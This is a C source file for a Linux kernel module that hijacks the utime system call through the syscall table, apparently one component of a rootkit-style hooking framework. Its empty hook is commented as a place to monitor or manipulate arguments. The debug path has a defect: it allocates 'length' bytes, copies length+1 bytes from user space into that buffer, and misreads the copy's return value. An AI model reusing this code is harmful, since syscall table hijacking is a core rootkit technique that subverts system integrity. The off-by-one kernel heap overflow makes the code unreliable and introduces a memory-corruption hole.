#include "common.h"
#include <asm/uaccess.h>
#include <linux/limits.h>
#include <linux/utime.h>
asmlinkage long (*sys_utime)(char __user *filename, struct utimbuf __user *times);

void hook_utime(char __user *filename, struct utimbuf __user *times)
{
    /* Monitor/manipulate utime arguments here */
}



asmlinkage long n_sys_utime (char __user *filename, struct utimbuf __user *times)
{

    long ret;

    #if __DEBUG_TS__
  
    void *debug;
    int length = 0;
    //get the length of the filename from userspace
    length = strnlen_user(filename, NAME_MAX);
    if(length <= 0)
    {
       DEBUG_RW("Error: Failed to get the length of the file string\n");
    }
    else
    {

      debug = kmalloc(length, GFP_KERNEL);
      if ( ! debug )
      {
        DEBUG_RW("ERROR: Failed to allocate %i bytes for sys_utime debugging\n", length);
      }
      else
      {
        if ( strncpy_from_user(debug, filename, length + 1) == 0)
        {
            DEBUG_RW("ERROR: Failed to copy %i bytes from user for sys_utime debugging\n", length);
            kfree(debug);
        }
        else
        {  
            
            DEBUG_RW("Timestamp for '%s' was changed!\n", debug);
            kfree(debug);
        }
      }
    }
    #endif

    hook_utime(filename, times);

    hijack_pause(sys_utime);
    ret = sys_utime(filename, times);
    hijack_resume(sys_utime);

    return ret;
}

void hookts_init ( void )
{
    DEBUG("Hooking sys_utime\n");

    sys_utime = (void *)sys_call_table[__NR_utime];
    hijack_start(sys_utime, &n_sys_utime);

}

void hookts_exit ( void )
{
    DEBUG("Unhooking sys_utime\n");
    hijack_stop(sys_utime);
}
